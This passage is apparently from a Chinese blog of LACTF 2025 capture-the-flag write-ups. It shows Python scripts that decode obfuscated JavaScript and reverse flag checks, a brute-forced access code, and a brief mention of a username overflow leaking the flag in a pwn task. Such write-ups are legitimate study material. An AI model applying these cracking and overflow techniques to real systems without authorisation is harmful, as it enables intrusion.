</blockquote>
<p>直接google搜图就可以了</p>
<p><img src="/images/2025LACTF/image-20250208183540049.png"></p>
<p>定位到73G66738+9C</p>
<p><img src="/images/2025LACTF/image-20250208183600132.png"></p>
<p>所以flag为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{73G66738+9C}</span><br></pre></td></tr></table></figure>
<h2 id="web">Web</h2>
<h3 id="lucky-flag">lucky-flag</h3>
<p>打开来发现全是图标</p>
<p><img src="/images/2025LACTF/image-20250208155833783.png"></p>
<p>打开源代码查看：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">$</span> = q =&gt; <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(q);</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">$a</span> = q =&gt; <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(q);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> boxes = $a(<span class="string">'.box'</span>);</span><br><span class="line"><span class="keyword">let</span> flagbox = boxes[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * boxes.<span class="property">length</span>)];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> box <span class="keyword">of</span> boxes) {</span><br><span class="line">  <span class="keyword">if</span> (box === flagbox) {</span><br><span class="line">    box.<span class="property">onclick</span> = <span class="function">() =&gt;</span> {</span><br><span class="line">      <span class="keyword">let</span> enc = <span class="string">`"\\u000e\\u0003\\u0001\\u0016\\u0004\\u0019\\u0015V\\u0011=\\u000bU=\\u000e\\u0017\\u0001\\t=R\\u0010=\\u0011\\t\\u000bSS\\u001f"`</span>;</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; enc.<span class="property">length</span>; ++i) {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">          enc = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(enc);</span><br><span class="line">        } <span class="keyword">catch</span> (e) { }</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">let</span> rw = [];</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">const</span> e <span class="keyword">of</span> enc) {</span><br><span class="line">        rw[<span class="string">'\x70us\x68'</span>](e[<span class="string">'\x63har\x43ode\x41t'</span>](<span class="number">0</span>) ^ <span class="number">0x62</span>);</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">const</span> x = rw[<span class="string">'\x6dap'</span>](<span class="function"><span class="params">x</span> =&gt;</span> <span class="title class_">String</span>[<span class="string">'\x66rom\x43har\x43ode'</span>](x));</span><br><span class="line">      <span class="title function_">alert</span>(<span class="string">`Congrats <span class="subst">${x[<span class="string">'\x6aoin'</span>](<span class="string">''</span>)}</span>`</span>);</span><br><span class="line">    };</span><br><span class="line">    flagbox = <span class="literal">null</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    box.<span class="property">onclick</span> = <span class="function">() =&gt;</span> <span class="title function_">alert</span>(<span class="string">'no flag here'</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>发现如果点击正确的话，就可以进行输出正确的flag，我们逆向还原一下就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原代码中的编码字符串</span></span><br><span class="line">enc = <span class="string">'"\\u000e\\u0003\\u0001\\u0016\\u0004\\u0019\\u0015V\\u0011=\\u000bU=\\u000e\\u0017\\u0001\\t=R\\u0010=\\u0011\\t\\u000bSS\\u001f"'</span></span><br><span class="line"><span class="comment"># 多次进行类似 JSON.parse 的操作，去除多余转义字符</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        enc = <span class="built_in">eval</span>(enc)</span><br><span class="line">    <span class="keyword">except</span> SyntaxError:</span><br><span class="line">        <span class="comment"># 解析出错则跳过，继续下一次尝试</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"><span class="comment"># 用于存储解码后的字符编码</span></span><br><span class="line">rw = []</span><br><span class="line"><span class="comment"># 对解析后的字符串每个字符进行异或操作</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> enc:</span><br><span class="line">    rw.append(<span class="built_in">ord</span>(char) ^ <span class="number">0x62</span>)</span><br><span class="line"><span class="comment"># 将字符编码转换为对应的字符</span></span><br><span class="line">x = [<span class="built_in">chr</span>(code) <span class="keyword">for</span> code <span class="keyword">in</span> rw]</span><br><span class="line"><span class="comment"># 将字符数组拼接成字符串</span></span><br><span class="line">flag = <span class="string">''</span>.join(x)</span><br><span class="line"><span class="comment"># 输出解码后的 flag</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{w4s_i7_luck_0r_ski11}</span><br></pre></td></tr></table></figure>
<h2 id="reverse">Reverse</h2>
<h3 id="javascryption">javascryption</h3>
<p>打开一看是个web页面，查看源代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> msg = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"msg"</span>);</span><br><span class="line"><span class="keyword">const</span> flagInp = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"flag"</span>);</span><br><span class="line"><span class="keyword">const</span> checkBtn = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">"check"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFlag</span>(<span class="params">flag</span>) {</span><br><span class="line">    <span class="keyword">const</span> step1 = <span class="title function_">btoa</span>(flag);</span><br><span class="line">    <span class="keyword">const</span> step2 = step1.<span class="title function_">split</span>(<span class="string">""</span>).<span class="title function_">reverse</span>().<span class="title function_">join</span>(<span class="string">""</span>);</span><br><span class="line">    <span class="keyword">const</span> step3 = step2.<span class="title function_">replaceAll</span>(<span class="string">"Z"</span>, <span class="string">"[OLD_DATA]"</span>);</span><br><span class="line">    <span class="keyword">const</span> step4 = <span class="built_in">encodeURIComponent</span>(step3);</span><br><span class="line">    <span class="keyword">const</span> step5 = <span class="title function_">btoa</span>(step4);</span><br><span class="line">    <span class="keyword">return</span> step5 === <span class="string">"JTNEJTNEUWZsSlglNUJPTERfREFUQSU1RG85MWNzeFdZMzlWZXNwbmVwSjMlNUJPTERfREFUQSU1RGY5bWI3JTVCT0xEX0RBVEElNURHZGpGR2I="</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">checkBtn.<span class="title function_">addEventListener</span>(<span class="string">"click"</span>, <span class="function">() =&gt;</span> {</span><br><span class="line">    <span class="keyword">const</span> flag = flagInp.<span class="property">value</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">checkFlag</span>(flag)) {</span><br><span class="line">        flagInp.<span class="title function_">remove</span>();</span><br><span class="line">        checkBtn.<span class="title function_">remove</span>();</span><br><span class="line">        msg.<span class="property">innerText</span> = flag;</span><br><span class="line">        msg.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">"correct"</span>);</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">        checkBtn.<span class="property">classList</span>.<span class="title function_">remove</span>(<span class="string">"shake"</span>);</span><br><span class="line">        checkBtn.<span class="property">offsetHeight</span>;</span><br><span class="line">        checkBtn.<span class="property">classList</span>.<span class="title function_">add</span>(<span class="string">"shake"</span>);</span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></table></figure>
<p>签到题，直接逆向就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最终的 Base64 编码字符串</span></span><br><span class="line">encoded_result = <span class="string">"JTNEJTNEUWZsSlglNUJPTERfREFUQSU1RG85MWNzeFdZMzlWZXNwbmVwSjMlNUJPTERfREFUQSU1RGY5bWI3JTVCT0xEX0RBVEElNURHZGpGR2I="</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 5 逆向：Base64 解码</span></span><br><span class="line">step4 = base64.b64decode(encoded_result).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 4 逆向：URI 解码</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line">step3 = unquote(step4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 3 逆向：替换 [OLD_DATA] 为 Z</span></span><br><span class="line">step2 = step3.replace(<span class="string">"[OLD_DATA]"</span>, <span class="string">"Z"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 2 逆向：反转字符串</span></span><br><span class="line">step1 = step2[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 步骤 1 逆向：Base64 解码</span></span><br><span class="line">original_flag = base64.b64decode(step1).decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(original_flag)</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{no_grizzly_walls_here}</span><br></pre></td></tr></table></figure>
<h3 id="patricks-paraflag">patricks-paraflag</h3>
<p>也是签到题</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-208h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">264</span>]; <span class="comment">// [rsp+100h] [rbp-108h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What do you think the flag is? "</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(_bss_start);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">256</span>, stdin);</span><br><span class="line">  v3 = <span class="built_in">strcspn</span>(s, <span class="string">"\n"</span>);</span><br><span class="line">  s[v3] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(target) == v3 )</span><br><span class="line">  {</span><br><span class="line">    v4 = v3 &gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">1</span> )</span><br><span class="line">    {</span><br><span class="line">      v5 = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      {</span><br><span class="line">        v8[<span class="number">2</span> * v5] = s[v5];</span><br><span class="line">        v8[<span class="number">2</span> * v5 + <span class="number">1</span>] = s[v4 + v5];</span><br><span class="line">        ++v5;</span><br><span class="line">      }</span><br><span class="line">      <span class="keyword">while</span> ( v5 &lt; v4 );</span><br><span class="line">    }</span><br><span class="line">    v8[v3] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Paradoxified: %s\n"</span>, v8);</span><br><span class="line">    v6 = <span class="built_in">strcmp</span>(target, v8);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"You got the flag wrong &gt;:("</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"That's the flag! :D"</span>);</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bad length &gt;:("</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> v6;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>可以知道，flag是由target分为两部分，再拼接而成的</p>
<p>我们找到对应的target即可</p>
<p>target为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l_alcotsft{_tihne__ifnlfaign_igtoyt}</span><br></pre></td></tr></table></figure>
<p>然后还原即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">target = <span class="string">"l_alcotsft{_tihne__ifnlfaign_igtoyt}"</span></span><br><span class="line"><span class="comment"># 计算 target 长度的一半</span></span><br><span class="line">half_length = <span class="built_in">len</span>(target) // <span class="number">2</span></span><br><span class="line"><span class="comment"># 初始化存储前半部分和后半部分的列表</span></span><br><span class="line">first_half = []</span><br><span class="line">second_half = []</span><br><span class="line"><span class="comment"># 遍历，按顺序提取前半部分和后半部分的字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(half_length):</span><br><span class="line">    first_half.append(target[<span class="number">2</span> * i])</span><br><span class="line">    second_half.append(target[<span class="number">2</span> * i + <span class="number">1</span>])</span><br><span class="line"><span class="comment"># 将列表转换为字符串</span></span><br><span class="line">first_half_str = <span class="string">''</span>.join(first_half)</span><br><span class="line">second_half_str = <span class="string">''</span>.join(second_half)</span><br><span class="line"><span class="comment"># 拼接前半部分和后半部分得到原始 flag</span></span><br><span class="line">original_flag = first_half_str + second_half_str</span><br><span class="line"><span class="built_in">print</span>(original_flag)</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{the_flag_got_lost_in_infinity}</span><br></pre></td></tr></table></figure>
<h3 id="nine-solves">nine-solves</h3>
<p>先查看一下main函数逆向的c++代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">  __int64 i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">6</span>]; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+6h] [rbp-12h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to the Tianhuo Research Center."</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please enter your access code: "</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">fgets</span>(v8, <span class="number">16</span>, stdin);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">6</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    v4 = v8[i];</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(v8[i] - <span class="number">32</span>) &gt; <span class="number">0x5Eu</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    v5 = yi[i];</span><br><span class="line">    <span class="keyword">if</span> ( !v5 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    v6 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( (v4 &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">    {</span><br><span class="line">      ++v6;</span><br><span class="line">      v4 &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == v6 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">LABEL_6:</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">    }</span><br><span class="line">    ++v6;</span><br><span class="line">    v4 = <span class="number">3</span> * v4 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v5 != v6 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_6;</span><br><span class="line">LABEL_9:</span><br><span class="line">    <span class="keyword">if</span> ( v4 != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( !v9 || v9 == <span class="number">10</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="built_in">eigong</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">LABEL_14:</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"ACCESS DENIED"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>说明我们要寻找的是六位的访问码，交互即可获得flag</p>
<p>只需要简单的进行逆向的分析即可还原六位的访问码</p>
<p>首先查看yi数组的值，为[27, 38, 87, 95, 118, 9]</p>
<p><img src="/images/2025LACTF/image-20250208192432314.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">yi = [<span class="number">27</span>, <span class="number">38</span>, <span class="number">87</span>, <span class="number">95</span>, <span class="number">118</span>, <span class="number">9</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">forward_verify</span>(<span class="params">char_value, target</span>):</span><br><span class="line">    v4 = char_value</span><br><span class="line">    v6 = <span class="number">0</span></span><br><span class="line">    <span class="comment"># 处理右移操作</span></span><br><span class="line">    <span class="keyword">while</span> (v4 &amp; <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">        v6 += <span class="number">1</span></span><br><span class="line">        v4 &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> v6 == target:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 处理 3n + 1 操作</span></span><br><span class="line">    <span class="keyword">while</span> v4 != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (v4 &amp; <span class="number">1</span>) == <span class="number">0</span>:</span><br><span class="line">            v6 += <span class="number">1</span></span><br><span class="line">            v4 &gt;&gt;= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v6 += <span class="number">1</span></span><br><span class="line">            v4 = <span class="number">3</span> * v4 + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> v6 == target</span><br><span class="line"></span><br><span class="line">access_code = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(yi)):</span><br><span class="line">    found = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># 遍历合法的 ASCII 码范围</span></span><br><span class="line">    <span class="keyword">for</span> char_value <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">32</span> + <span class="number">0x5E</span> + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> forward_verify(char_value, yi[i]):</span><br><span class="line">            access_code += <span class="built_in">chr</span>(char_value)</span><br><span class="line">            found = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f"No valid solution found for position <span class="subst">{i}</span>."</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f"The access code is: <span class="subst">{access_code}</span>"</span>)</span><br></pre></td></tr></table></figure>
<p>输出：The access code is: AigyaP</p>
<p>交互输入AigyaP即可获得flag</p>
<p><img src="/images/2025LACTF/image-20250208192513204.png"></p>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{the_only_valid_solution_is_BigyaP}</span><br></pre></td></tr></table></figure>
<h2 id="pwn">Pwn</h2>
<h3 id="password">2password</h3>
<p>直接用户名栈溢出就可以了</p>
<p><img src="/images/2025LACTF/image-20250208170205627.png"></p>
<p>得到十六进制小端序：0x75687b667463616c0x66635f327265746e0x7d38367a783063</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">hex_strings = [<span class="string">"0x75687b667463616c"</span>, <span class="string">"0x66635f327265746e"</span>, <span class="string">"0x7d38367a783063"</span>]</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> hex_str <span class="keyword">in</span> hex_strings:</span><br><span class="line">    <span class="comment"># 去除 '0x' 前缀</span></span><br><span class="line">    hex_str = hex_str[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># 将十六进制字符串按每两个字符分割成字节</span></span><br><span class="line">    bytes_list = [hex_str[i:i+<span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_str), <span class="number">2</span>)]</span><br><span class="line">    <span class="comment"># 反转字节顺序</span></span><br><span class="line">    reversed_bytes = bytes_list[::-<span class="number">1</span>]</span><br><span class="line">    <span class="comment"># 将反转后的字节列表拼接成十六进制字符串</span></span><br><span class="line">    reversed_hex = <span class="string">''</span>.join(reversed_bytes)</span><br><span class="line">    <span class="comment"># 将十六进制字符串转换为字节对象</span></span><br><span class="line">    byte_obj = <span class="built_in">bytes</span>.fromhex(reversed_hex)</span><br><span class="line">    <span class="comment"># 将字节对象解码为字符串</span></span><br><span class="line">    result += byte_obj.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lactf{hunter2_cfc0xz68}</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://luhaozhhhe.github.io/2025/02/01/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

